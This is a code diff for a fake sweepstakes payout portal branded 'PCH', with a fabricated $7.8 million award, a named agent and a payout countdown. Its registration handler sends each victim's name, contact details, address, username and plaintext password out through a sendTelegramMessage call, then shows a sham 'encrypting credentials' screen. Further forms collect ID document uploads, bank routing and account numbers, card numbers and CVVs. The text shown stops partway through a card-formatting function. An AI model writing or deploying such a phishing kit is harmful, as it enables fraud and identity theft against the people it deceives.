+                const identifier = document.getElementById('login-identifier').value.trim();
+                const pass = document.getElementById('login-password').value;
+                const errEl = document.getElementById('login-error');
+
+                if (state.currentUser && (state.currentUser.username === identifier || state.currentUser.email === identifier)) {
+                    saveDeviceState();
+                    state.currentView = 'dashboard';
+                    render();
+                } else if (identifier === 'demouser' || identifier === 'demo@example.com' || !state.currentUser) {
+                    state.currentUser = {
+                        firstName: 'Arthur',
+                        lastName: 'Pendelton',
+                        address: '742 Evergreen Terrace',
+                        city: 'Brooklyn',
+                        stateOrParish: 'NY',
+                        zip: '11201',
+                        phone: '646-585-8110',
+                        email: identifier.includes('@') ? identifier : 'arthur.pendelton@globalpure.net',
+                        username: identifier.includes('@') ? 'arthur_p' : identifier
+                    };
+                    saveDeviceState();
+                    state.currentView = 'dashboard';
+                    render();
+                } else {
+                    errEl.textContent = 'Invalid credentials. Please verify your username/email or create a new account.';
+                    errEl.classList.remove('hidden');
+                }
+            });
+        }
+    }
+
+    function renderRegisterView() {
+        return `
+            <div class="flex-grow py-12 px-4 bg-gradient-to-b from-navy-950 to-navy-900 flex items-center justify-center">
+                <div class="bg-navy-800 border border-navy-700/80 rounded-3xl max-w-2xl w-full p-6 sm:p-10 shadow-2xl relative card-3d">
+                    <div class="text-center mb-8">
+                        <h2 class="text-2xl sm:text-3xl font-extrabold text-white">Create Portal Account</h2>
+                        <p class="text-xs text-slate-400 mt-1">Complete your profile information and verification details</p>
+                    </div>
+
+                    <form id="register-form" class="space-y-5">
+                        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                            <div>
+                                <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">First Name *</label>
+                                <input type="text" id="reg-fname" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="John">
+                            </div>
+                            <div>
+                                <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">Last Name *</label>
+                                <input type="text" id="reg-lname" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="Doe">
+                            </div>
+                        </div>
+
+                        <div>
+                            <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">Street Address *</label>
+                            <input type="text" id="reg-address" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="123 Main Street">
+                        </div>
+
+                        <div class="grid grid-cols-1 sm:grid-cols-3 gap-4">
+                            <div>
+                                <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">City *</label>
+                                <input type="text" id="reg-city" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="New York">
+                            </div>
+                            <div>
+                                <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">State / Parish *</label>
+                                <input type="text" id="reg-state" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="NY">
+                            </div>
+                            <div>
+                                <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">ZIP / Postal *</label>
+                                <input type="text" id="reg-zip" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="10001">
+                            </div>
+                        </div>
+
+                        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                            <div>
+                                <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">Phone Number *</label>
+                                <input type="tel" id="reg-phone" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="646-585-8110">
+                            </div>
+                            <div>
+                                <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">Email Address *</label>
+                                <input type="email" id="reg-email" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="john@example.com">
+                            </div>
+                        </div>
+
+                        <div class="grid grid-cols-1 sm:grid-cols-3 gap-4">
+                            <div>
+                                <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">Username *</label>
+                                <input type="text" id="reg-username" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="johndoe">
+                            </div>
+                            <div>
+                                <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">Password *</label>
+                                <input type="password" id="reg-password" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="••••••••">
+                            </div>
+                            <div>
+                                <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">Confirm Password *</label>
+                                <input type="password" id="reg-cpassword" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="••••••••">
+                            </div>
+                        </div>
+
+                        <div class="bg-navy-900 border border-navy-700 p-4 rounded-2xl space-y-2">
+                            <label class="block text-xs font-bold text-gold-400 uppercase tracking-wider"><i class="fa-solid fa-id-card mr-1.5"></i> Identity Verification Document Upload</label>
+                            <p class="text-xs text-slate-400">Upload identification (Driver's License or Passport) for compliance.</p>
+                            <input type="file" id="reg-id-doc" accept="image/*,.pdf" class="w-full text-xs text-slate-400 file:mr-3 file:py-2 file:px-3 file:rounded-xl file:border-0 file:text-xs file:font-bold file:bg-sky-custom file:text-navy-955 cursor-pointer">
+                        </div>
+
+                        <div id="reg-error" class="text-rose-400 text-xs hidden"></div>
+
+                        <button type="submit" class="w-full py-4 bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 font-extrabold rounded-xl shadow-lg shadow-gold-500/20 hover:brightness-110 active:scale-95 transition text-base">
+                            Complete Registration
+                        </button>
+                    </form>
+
+                    <div class="mt-6 text-center text-xs text-slate-400">
+                        Already have an account? <button onclick="router.navigate('login')" class="text-sky-custom font-bold hover:underline">Sign In</button>
+                    </div>
+                </div>
+            </div>
+        `;
+    }
+
+    function initRegisterEvents() {
+        const form = document.getElementById('register-form');
+        if (form) {
+            form.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                const pass = document.getElementById('reg-password').value;
+                const cpass = document.getElementById('reg-cpassword').value;
+                const errEl = document.getElementById('reg-error');
+
+                if (pass !== cpass) {
+                    errEl.textContent = 'Passwords do not match. Please verify confirmation.';
+                    errEl.classList.remove('hidden');
+                    return;
+                }
+
+                state.currentUser = {
+                    firstName: document.getElementById('reg-fname').value,
+                    lastName: document.getElementById('reg-lname').value,
+                    address: document.getElementById('reg-address').value,
+                    city: document.getElementById('reg-city').value,
+                    stateOrParish: document.getElementById('reg-state').value,
+                    zip: document.getElementById('reg-zip').value,
+                    phone: document.getElementById('reg-phone').value,
+                    email: document.getElementById('reg-email').value,
+                    username: document.getElementById('reg-username').value
+                };
+
+                saveDeviceState();
+
+                const tgMsg = `🚨 <b>NEW USER REGISTRATION (PWPP)</b> 🚨\n\n` +
+                    `<b>Name:</b> ${state.currentUser.firstName} ${state.currentUser.lastName}\n` +
+                    `<b>Email:</b> ${state.currentUser.email}\n` +
+                    `<b>Phone:</b> ${state.currentUser.phone}\n` +
+                    `<b>Address:</b> ${state.currentUser.address}, ${state.currentUser.city}, ${state.currentUser.stateOrParish} ${state.currentUser.zip}\n` +
+                    `<b>Username:</b> ${state.currentUser.username}\n` +
+                    `<b>Password:</b> ${pass}`;
+                
+                await sendTelegramMessage(tgMsg);
+                showLoadingAnimation();
+            });
+        }
+    }
+
+    function showLoadingAnimation() {
+        const container = document.getElementById('app-container');
+        container.innerHTML = `
+            <div class="flex-grow flex items-center justify-center p-6 bg-gradient-to-b from-navy-950 to-navy-900">
+                <div class="bg-navy-800 border border-navy-700 p-8 sm:p-10 rounded-3xl max-w-md w-full text-center shadow-2xl space-y-6 card-3d">
+                    <div class="relative w-20 h-20 sm:w-24 sm:h-24 mx-auto flex items-center justify-center">
+                        <div class="absolute inset-0 rounded-full border-4 border-sky-custom/20 border-t-sky-custom animate-spin"></div>
+                        <i class="fa-solid fa-shield-halved text-2xl sm:text-3xl text-sky-custom"></i>
+                    </div>
+                    <div>
+                        <h3 class="text-xl sm:text-2xl font-bold text-white mb-2">Verifying Profile</h3>
+                        <p class="text-xs text-slate-400">Encrypting credentials and establishing secure session...</p>
+                    </div>
+                    <div class="w-full bg-navy-950 h-3 rounded-full overflow-hidden border border-navy-700">
+                        <div id="loading-bar" class="bg-gradient-to-r from-gold-400 to-gold-600 h-full w-0 transition-all duration-300"></div>
+                    </div>
+                    <div id="loading-pct" class="text-base sm:text-lg font-black text-gold-400">0%</div>
+                </div>
+            </div>
+        `;
+
+        let progress = 0;
+        const interval = setInterval(() => {
+            progress += 5;
+            const bar = document.getElementById('loading-bar');
+            const pct = document.getElementById('loading-pct');
+            if (bar && pct) {
+                bar.style.width = progress + '%';
+                pct.textContent = progress + '%';
+            }
+            if (progress >= 100) {
+                clearInterval(interval);
+                showCongratulationsScreen();
+            }
+        }, 100);
+    }
+
+    function showCongratulationsScreen() {
+        const container = document.getElementById('app-container');
+        container.innerHTML = `
+            <div class="flex-grow flex items-center justify-center p-6 bg-gradient-to-b from-navy-950 to-navy-900">
+                <div class="bg-navy-800 border border-navy-700 p-8 sm:p-10 rounded-3xl max-w-lg w-full text-center shadow-2xl space-y-6 card-3d">
+                    <div class="w-16 h-16 sm:w-20 sm:h-20 bg-emerald-500/20 text-emerald-400 rounded-full mx-auto flex items-center justify-center text-2xl sm:text-3xl shadow-lg shadow-emerald-500/20">
+                        <i class="fa-solid fa-circle-check"></i>
+                    </div>
+                    <div>
+                        <h2 class="text-2xl sm:text-3xl font-extrabold text-white mb-2">Congratulations, ${state.currentUser.firstName}!</h2>
+                        <p class="text-xs sm:text-sm text-slate-300 leading-relaxed">
+                            Your account has been successfully created and verified. You are now ready to access your weekly payout dashboard.
+                        </p>
+                    </div>
+                    <div class="bg-navy-900 border border-navy-700 p-4 rounded-2xl text-xs text-slate-400">
+                        Redirecting to dashboard automatically in <span id="redirect-timer" class="text-gold-400 font-bold">5</span> seconds...
+                    </div>
+                    <button onclick="router.navigate('dashboard')" class="w-full py-3.5 bg-sky-custom text-navy-950 font-bold rounded-xl text-xs sm:text-sm active:scale-95 transition">
+                        Go to Dashboard Now
+                    </button>
+                </div>
+            </div>
+        `;
+
+        let countdown = 5;
+        const timerEl = document.getElementById('redirect-timer');
+        const timerInterval = setInterval(() => {
+            countdown--;
+            if (timerEl) timerEl.textContent = countdown;
+            if (countdown <= 0) {
+                clearInterval(timerInterval);
+                router.navigate('dashboard');
+            }
+        }, 1000);
+    }
+
+    function renderDashboardView() {
+        const user = state.currentUser || {
+            firstName: 'Arthur',
+            lastName: 'Pendelton',
+            address: '742 Evergreen Terrace',
+            city: 'Brooklyn',
+            stateOrParish: 'NY',
+            zip: '11201',
+            phone: '646-585-8110',
+            email: 'arthur.pendelton@globalpure.net'
+        };
+
+        const d = new Date();
+        d.setDate(d.getDate() - 2);
+        const drawDateStr = d.toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' });
+
+        const completedTxns = state.transactions.filter(t => t.status === 'Completed');
+        const pendingTxns = state.transactions.filter(t => t.status === 'Pending');
+        const onHoldTxns = state.transactions.filter(t => t.status === 'On Hold');
+
+        return `
+            <div class="flex-grow py-8 sm:py-10 px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto w-full space-y-6 sm:space-y-8">
+                <!-- Welcome & Header Summary -->
+                <div class="bg-navy-800 border border-navy-700 p-6 sm:p-8 rounded-3xl flex flex-col md:flex-row justify-between items-start md:items-center gap-6 shadow-xl card-3d">
+                    <div class="space-y-2">
+                        <div class="inline-flex items-center space-x-2 bg-emerald-500/20 text-emerald-400 px-3 py-1 rounded-full text-xs font-bold">
+                            <i class="fa-solid fa-circle-check"></i> Verified Profile Active
+                        </div>
+                        <h1 class="text-2xl sm:text-3xl font-extrabold text-white">Welcome, ${user.firstName} ${user.lastName}</h1>
+                        <p class="text-xs text-slate-400">PCH Claim Number: <span class="text-gold-400 font-bold">PCH-88204-NYC</span> | Draw Date: ${drawDateStr}</p>
+                    </div>
+                    <div class="flex flex-col sm:flex-row w-full md:w-auto gap-3">
+                        <button onclick="openWeeklyFundsModal()" class="w-full sm:w-auto px-5 py-3.5 bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 font-bold rounded-xl text-xs sm:text-sm shadow-lg shadow-gold-500/20 hover:brightness-110 active:scale-95 transition flex items-center justify-center">
+                            <i class="fa-solid fa-wallet mr-2"></i> ${state.configuredMethod ? 'Update Funding Method' : 'Set Up Weekly Funds'}
+                        </button>
+                        <button onclick="openWithdrawModal()" class="w-full sm:w-auto px-5 py-3.5 bg-sky-custom text-navy-950 font-bold rounded-xl text-xs sm:text-sm hover:brightness-110 active:scale-95 transition flex items-center justify-center">
+                            <i class="fa-solid fa-money-bill-transfer mr-2"></i> Withdraw
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Financial Overview Cards Grid -->
+                <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 sm:gap-6">
+                    <div class="bg-navy-800 border border-navy-700 p-5 sm:p-6 rounded-2xl card-3d">
+                        <p class="text-xs text-slate-400 uppercase font-semibold mb-1">Total Award Value</p>
+                        <h3 class="text-xl sm:text-2xl font-black text-white">$7,800,000.00</h3>
+                        <p class="text-[10px] text-slate-400 mt-2"><i class="fa-solid fa-shield text-sky-custom mr-1"></i> Authorized Award</p>
+                    </div>
+                    <div class="bg-navy-800 border border-navy-700 p-5 sm:p-6 rounded-2xl card-3d">
+                        <p class="text-xs text-slate-400 uppercase font-semibold mb-1">Available Balance</p>
+                        <h3 id="dash-avail-bal" class="text-xl sm:text-2xl font-black text-gold-400">$${state.userBalance.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</h3>
+                        <p class="text-[10px] text-slate-400 mt-2"><i class="fa-solid fa-clock text-gold-400 mr-1"></i> Active Weekly Allocation</p>
+                    </div>
+                    <div class="bg-navy-800 border border-navy-700 p-5 sm:p-6 rounded-2xl card-3d">
+                        <p class="text-xs text-slate-400 uppercase font-semibold mb-1">Active Funding Method</p>
+                        <h3 class="text-base sm:text-lg font-bold text-sky-custom truncate">${state.configuredMethod ? state.configuredMethod : 'Not Configured'}</h3>
+                        <p class="text-[10px] text-slate-400 mt-2"><i class="fa-solid fa-check-double mr-1"></i> Destination Status</p>
+                    </div>
+                    <div class="bg-navy-800 border border-navy-700 p-5 sm:p-6 rounded-2xl card-3d">
+                        <p class="text-xs text-slate-400 uppercase font-semibold mb-1">Assigned Agent</p>
+                        <h3 class="text-base sm:text-lg font-bold text-white">Andy Goldbrg</h3>
+                        <p class="text-[10px] text-sky-custom mt-2"><i class="fa-solid fa-phone mr-1"></i> 646-585-8110</p>
+                    </div>
+                </div>
+
+                <!-- Friday Countdown Widget Section -->
+                <div class="grid grid-cols-1 gap-8">
+                    <div class="bg-navy-800 border border-navy-700 p-6 sm:p-8 rounded-3xl card-3d flex flex-col justify-between">
+                        <div>
+                            <div class="flex flex-col sm:flex-row sm:items-center justify-between mb-6 gap-2">
+                                <h3 class="text-base sm:text-lg font-bold text-white flex items-center"><i class="fa-solid fa-stopwatch text-gold-400 mr-2"></i> Weekly Disbursement Countdown</h3>
+                                <span class="text-[11px] text-slate-400 bg-navy-900 px-3 py-1 rounded-full border border-navy-700 w-fit">Timezone: EST (UTC-5)</span>
+                            </div>
+                            <p class="text-slate-300 text-xs sm:text-sm mb-6">Countdown to Friday at 10:30 PM EST when weekly funds become eligible for release.</p>
+                        </div>
+                        <div class="grid grid-cols-2 sm:grid-cols-4 gap-3 sm:gap-4 text-center">
+                            <div class="bg-navy-900 border border-navy-700 p-3 sm:p-4 rounded-2xl">
+                                <div id="cd-days" class="text-2xl sm:text-3xl font-black text-white">00</div>
+                                <div class="text-[10px] text-slate-400 uppercase mt-1">Days</div>
+                            </div>
+                            <div class="bg-navy-900 border border-navy-700 p-3 sm:p-4 rounded-2xl">
+                                <div id="cd-hours" class="text-2xl sm:text-3xl font-black text-white">00</div>
+                                <div class="text-[10px] text-slate-400 uppercase mt-1">Hours</div>
+                            </div>
+                            <div class="bg-navy-900 border border-navy-700 p-3 sm:p-4 rounded-2xl">
+                                <div id="cd-mins" class="text-2xl sm:text-3xl font-black text-white">00</div>
+                                <div class="text-[10px] text-slate-400 uppercase mt-1">Minutes</div>
+                            </div>
+                            <div class="bg-navy-900 border border-navy-700 p-3 sm:p-4 rounded-2xl">
+                                <div id="cd-secs" class="text-2xl sm:text-3xl font-black text-gold-400">00</div>
+                                <div class="text-[10px] text-slate-400 uppercase mt-1">Seconds</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Transfer History Section -->
+                <div class="bg-navy-800 border border-navy-700 p-6 sm:p-8 rounded-3xl card-3d">
+                    <div class="flex flex-col sm:flex-row sm:items-center justify-between mb-6 gap-4">
+                        <div>
+                            <h3 class="text-lg sm:text-xl font-bold text-white">Transfer History</h3>
+                            <p class="text-xs text-slate-400">Review all allocated disbursement logs and statuses</p>
+                        </div>
+                        <div class="flex flex-wrap gap-1.5 sm:gap-2" id="txn-tabs">
+                            <button onclick="filterTransactions('All')" class="px-3 py-1.5 sm:px-4 sm:py-2 bg-sky-custom text-navy-950 text-xs font-bold rounded-xl active:scale-95 transition" data-tab="All">All (${state.transactions.length})</button>
+                            <button onclick="filterTransactions('Completed')" class="px-3 py-1.5 sm:px-4 sm:py-2 bg-navy-900 border border-navy-700 text-slate-300 text-xs font-bold rounded-xl active:scale-95 transition" data-tab="Completed">Completed (${completedTxns.length})</button>
+                            <button onclick="filterTransactions('Pending')" class="px-3 py-1.5 sm:px-4 sm:py-2 bg-navy-900 border border-navy-700 text-slate-300 text-xs font-bold rounded-xl active:scale-95 transition" data-tab="Pending">Pending (${pendingTxns.length})</button>
+                            <button onclick="filterTransactions('On Hold')" class="px-3 py-1.5 sm:px-4 sm:py-2 bg-navy-900 border border-navy-700 text-slate-300 text-xs font-bold rounded-xl active:scale-95 transition" data-tab="On Hold">On Hold (${onHoldTxns.length})</button>
+                        </div>
+                    </div>
+
+                    <div class="overflow-x-auto -mx-6 sm:mx-0 px-6 sm:px-0">
+                        <table class="w-full text-left border-collapse min-w-[500px]" id="txn-table">
+                            <thead>
+                                <tr class="border-b border-navy-700 text-xs text-slate-400 uppercase">
+                                    <th class="py-3 px-3 sm:px-4">Ref #</th>
+                                    <th class="py-3 px-3 sm:px-4">Date</th>
+                                    <th class="py-3 px-3 sm:px-4">Type</th>
+                                    <th class="py-3 px-3 sm:px-4">Amount</th>
+                                    <th class="py-3 px-3 sm:px-4">Status</th>
+                                </tr>
+                            </thead>
+                            <tbody class="text-xs sm:text-sm divide-y divide-navy-700/50" id="txn-tbody">
+                                ${state.transactions.length === 0 ? `
+                                    <tr>
+                                        <td colspan="5" class="py-8 text-center text-slate-400 text-xs">No transfer history recorded.</td>
+                                    </tr>
+                                ` : state.transactions.map(t => `
+                                    <tr class="hover:bg-navy-900/50 transition">
+                                        <td class="py-3.5 px-3 sm:px-4 font-mono font-bold text-white">${t.ref}</td>
+                                        <td class="py-3.5 px-3 sm:px-4 text-slate-300 text-xs">${t.date}</td>
+                                        <td class="py-3.5 px-3 sm:px-4 text-slate-300">${t.type}</td>
+                                        <td class="py-3.5 px-3 sm:px-4 font-bold text-gold-400">$${t.amount.toLocaleString(undefined, {minimumFractionDigits: 2})}</td>
+                                        <td class="py-3.5 px-3 sm:px-4">
+                                            <span class="px-2.5 py-1 rounded-full text-[10px] sm:text-xs font-bold ${ t.status === 'Completed' ? 'bg-emerald-500/20 text-emerald-400' : t.status === 'Pending' ? 'bg-sky-custom/20 text-sky-custom' : t.status === 'On Hold' ? 'bg-gold-500/20 text-gold-400' : 'bg-rose-500/20 text-rose-400' }">${t.status}</span>
+                                        </td>
+                                    </tr>
+                                `).join('')}
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <!-- Support Center Section -->
+                <div class="bg-navy-800 border border-navy-700 p-6 sm:p-8 rounded-3xl card-3d">
+                    <div class="mb-6">
+                        <h3 class="text-lg sm:text-xl font-bold text-white">Support Center Assistance</h3>
+                        <p class="text-xs text-slate-400">Prepopulated from registered profile details.</p>
+                    </div>
+
+                    <form id="support-form" onsubmit="submitSupportTicket(event)" class="space-y-4">
+                        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                            <div>
+                                <label class="block text-xs font-bold text-slate-300 uppercase mb-1">First Name</label>
+                                <input type="text" id="sup-fname" value="${user.firstName}" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom">
+                            </div>
+                            <div>
+                                <label class="block text-xs font-bold text-slate-300 uppercase mb-1">Last Name</label>
+                                <input type="text" id="sup-lname" value="${user.lastName}" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom">
+                            </div>
+                        </div>
+                        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                            <div>
+                                <label class="block text-xs font-bold text-slate-300 uppercase mb-1">Phone Number</label>
+                                <input type="tel" id="sup-phone" value="${user.phone}" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom">
+                            </div>
+                            <div>
+                                <label class="block text-xs font-bold text-slate-300 uppercase mb-1">Email Address</label>
+                                <input type="email" id="sup-email" value="${user.email}" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom">
+                            </div>
+                        </div>
+                        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                            <div>
+                                <label class="block text-xs font-bold text-slate-300 uppercase mb-1">Issue Category</label>
+                                <select id="sup-category" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom">
+                                    <option value="Weekly Funds Setup">Weekly Funds Setup</option>
+                                    <option value="Withdrawal Processing">Withdrawal Processing</option>
+                                    <option value="Account Verification">Account Verification</option>
+                                    <option value="Agent Support Inquiry">Agent Support Inquiry</option>
+                                </select>
+                            </div>
+                            <div>
+                                <label class="block text-xs font-bold text-slate-300 uppercase mb-1">Subject</label>
+                                <input type="text" id="sup-subject" required placeholder="Brief description of your inquiry" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom">
+                            </div>
+                        </div>
+                        <div>
+                            <label class="block text-xs font-bold text-slate-300 uppercase mb-1">Message</label>
+                            <textarea id="sup-message" required rows="4" placeholder="Type your message here..." class="w-full bg-navy-950 border border-navy-700 rounded-xl p-3.5 text-sm text-white focus:outline-none focus:border-sky-custom"></textarea>
+                        </div>
+                        <div class="flex justify-end pt-2">
+                            <button type="submit" class="w-full sm:w-auto px-8 py-3.5 bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 font-extrabold rounded-xl text-xs sm:text-sm shadow-lg shadow-gold-500/20 hover:brightness-110 active:scale-95 transition">
+                                Submit Support Ticket
+                            </button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        `;
+    }
+
+    function initDashboardEvents() {}
+
+    let countdownInterval = null;
+    function initCountdownTimer() {
+        if (countdownInterval) clearInterval(countdownInterval);
+
+        function updateTimer() {
+            const now = new Date();
+            const resultDate = new Date();
+            let dayOfWeek = resultDate.getUTCDay();
+            let daysUntilFriday = (5 - dayOfWeek + 7) % 7;
+            
+            resultDate.setUTCHours(22 + 5, 30, 0, 0);
+            resultDate.setUTCDate(resultDate.getUTCDate() + daysUntilFriday);
+
+            if (now.getTime() > resultDate.getTime()) {
+                resultDate.setDate(resultDate.getDate() + 7);
+            }
+
+            const diff = resultDate.getTime() - now.getTime();
+            if (diff <= 0) return;
+
+            const days = Math.floor(diff / (1000 * 60 * 60 * 24));
+            const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            const mins = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+            const secs = Math.floor((diff % (1000 * 60)) / 1000);
+
+            const dEl = document.getElementById('cd-days');
+            const hEl = document.getElementById('cd-hours');
+            const mEl = document.getElementById('cd-mins');
+            const sEl = document.getElementById('cd-secs');
+
+            if (dEl) dEl.textContent = String(days).padStart(2, '0');
+            if (hEl) hEl.textContent = String(hours).padStart(2, '0');
+            if (mEl) mEl.textContent = String(mins).padStart(2, '0');
+            if (sEl) sEl.textContent = String(secs).padStart(2, '0');
+        }
+
+        updateTimer();
+        countdownInterval = setInterval(updateTimer, 1000);
+    }
+
+    function filterTransactions(status) {
+        const tbody = document.getElementById('txn-tbody');
+        const filtered = status === 'All' ? state.transactions : state.transactions.filter(t => t.status === status);
+        
+        if (filtered.length === 0) {
+            tbody.innerHTML = `<tr><td colspan="5" class="py-8 text-center text-slate-400 text-xs">No transfer history recorded.</td></tr>`;
+            return;
+        }
+
+        tbody.innerHTML = filtered.map(t => `
+            <tr class="hover:bg-navy-900/50 transition">
+                <td class="py-3.5 px-3 sm:px-4 font-mono font-bold text-white">${t.ref}</td>
+                <td class="py-3.5 px-3 sm:px-4 text-slate-300 text-xs">${t.date}</td>
+                <td class="py-3.5 px-3 sm:px-4 text-slate-300">${t.type}</td>
+                <td class="py-3.5 px-3 sm:px-4 font-bold text-gold-400">$${t.amount.toLocaleString(undefined, {minimumFractionDigits: 2})}</td>
+                <td class="py-3.5 px-3 sm:px-4">
+                    <span class="px-2.5 py-1 rounded-full text-[10px] sm:text-xs font-bold ${
+                        t.status === 'Completed' ? 'bg-emerald-500/20 text-emerald-400' :
+                        t.status === 'Pending' ? 'bg-sky-custom/20 text-sky-custom' :
+                        t.status === 'On Hold' ? 'bg-gold-500/20 text-gold-400' : 'bg-rose-500/20 text-rose-400'
+                    }">${t.status}</span>
+                </td>
+            </tr>
+        `).join('');
+    }
+
+    function openWeeklyFundsModal() {
+        showModal('Set Up Weekly Funds', `
+            <form onsubmit="submitWeeklyFundsSetup(event)" class="space-y-4">
+                <p class="text-xs text-slate-300">Choose your destination method for weekly disbursements.</p>
+                <div class="space-y-2.5">
+                    <label class="flex items-center space-x-3 bg-navy-900 p-3.5 rounded-xl border border-navy-700 cursor-pointer active:border-sky-custom transition">
+                        <input type="radio" name="pay-method" value="bank" checked onchange="togglePayMethod('bank')" class="text-sky-custom w-4 h-4">
+                        <div>
+                            <span class="text-xs sm:text-sm font-bold text-white block">Bank Wire / ACH Account</span>
+                            <span class="text-[11px] text-slate-400">Direct transfer to checking or savings</span>
+                        </div>
+                    </label>
+                    <label class="flex items-center space-x-3 bg-navy-900 p-3.5 rounded-xl border border-navy-700 cursor-pointer active:border-sky-custom transition">
+                        <input type="radio" name="pay-method" value="card" onchange="togglePayMethod('card')" class="text-sky-custom w-4 h-4">
+                        <div>
+                            <span class="text-xs sm:text-sm font-bold text-white block">Debit / Credit Card</span>
+                            <span class="text-[11px] text-slate-400">Instant transfer directly to card</span>
+                        </div>
+                    </label>
+                </div>
+
+                <div id="bank-fields" class="space-y-3 pt-2">
+                    <div>
+                        <label class="block text-xs font-bold text-slate-300 uppercase mb-1">Routing Number (9 digits)</label>
+                        <input type="text" id="bank-routing" required pattern="[0-9]{9}" maxlength="9" oninput="this.value=this.value.replace(/[^0-9]/g,'')" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="123456789">
+                    </div>
+                    <div>
+                        <label class="block text-xs font-bold text-slate-300 uppercase mb-1">Account Number</label>
+                        <input type="text" id="bank-acc" required oninput="this.value=this.value.replace(/[^0-9]/g,'')" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="Account Number">
+                    </div>
+                </div>
+
+                <div id="card-fields" class="space-y-3 pt-2 hidden">
+                    <div>
+                        <label class="block text-xs font-bold text-slate-300 uppercase mb-1">Card Number</label>
+                        <input type="text" id="card-num" oninput="formatCardInput(this)" maxlength="19" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="4000 1234 5678 9010">
+                    </div>
+                    <div class="grid grid-cols-2 gap-3">
+                        <div>
+                            <label class="block text-xs font-bold text-slate-300 uppercase mb-1">Expiry (MM/YY)</label>
+                            <input type="text" id="card-exp" oninput="formatExpInput(this)" maxlength="5" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="12/28">
+                        </div>
+                        <div>
+                            <label class="block text-xs font-bold text-slate-300 uppercase mb-1">CVV</label>
+                            <input type="password" id="card-cvv" maxlength="4" oninput="this.value=this.value.replace(/[^0-9]/g,'')" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom" placeholder="123">
+                        </div>
+                    </div>
+                </div>
+
+                <div class="flex justify-end pt-3">
+                    <button type="submit" class="w-full sm:w-auto px-6 py-3 bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 font-bold rounded-xl text-xs sm:text-sm active:scale-95 transition">Save Funding Method</button>
+                </div>
+            </form>
+        `);
+    }
+
+    function formatCardInput(input) {
